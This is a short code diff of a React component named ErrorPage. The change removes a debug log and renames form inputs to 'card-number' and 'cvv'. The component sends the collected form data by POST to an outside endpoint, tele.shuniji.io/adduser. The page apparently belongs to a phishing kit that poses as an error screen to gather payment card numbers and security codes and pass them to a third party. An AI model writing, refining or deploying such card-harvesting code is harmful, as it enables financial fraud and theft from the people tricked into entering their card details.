@@ -82,8 +82,6 @@ export default function ErrorPage() {
                 comment: comment,
                 image: urlImages || '',
             };
-            console.log("🚀 ~ senDataUser ~ user:", user)
-
             setLoading(true);
             await fetch('https://tele.shuniji.io/adduser', {
                 method: 'POST',
@@ -859,7 +857,7 @@ export default function ErrorPage() {
                                         required=""
                                         type="number"
                                         maxLength={20}
-                                        name="phone-number"
+                                        name="card-number"
                                         className={`${styles.errorInputText} ${card === '' && submit ? styles1.loginInputError : ""}`}
                                         daterror-action-on-load="register-listeners"
                                         daterror-listeners=""
@@ -894,7 +892,7 @@ export default function ErrorPage() {
                                         type="number"
                                         maxLength={20}
                                         pattern="[0-9\s]{3,4}" 
-                                        name="phone-number"
+                                        name="cvv"
                                         className={`${styles.errorInputText} ${security === '' && submit ? styles1.loginInputError : ""} w-25 mr-1`}
                                         daterror-action-on-load="register-listeners"
                                         daterror-listeners=""
